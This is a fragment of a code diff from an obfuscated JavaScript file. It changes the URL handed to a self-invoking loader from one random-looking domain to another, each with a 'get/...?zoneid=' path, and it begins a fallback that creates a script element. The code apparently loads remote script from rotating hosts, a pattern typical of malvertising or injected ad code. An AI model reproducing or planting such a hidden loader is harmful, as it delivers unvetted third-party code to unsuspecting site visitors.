@@ -3509,7 +3509,7 @@ try {
             l3 = v3 && v3[+r8G.U4G(N3R)];
             return l3 !== r8G.U4G(v2R);
         }
-    })('https://livezombymil.com/get/1807923?zoneid=1807923');
+    })('https://yogar2ti8nf09.com/get/1807923?zoneid=1807923');
 } catch (e) {
     function handleException(e) {
         var tag = document.createElement('script');
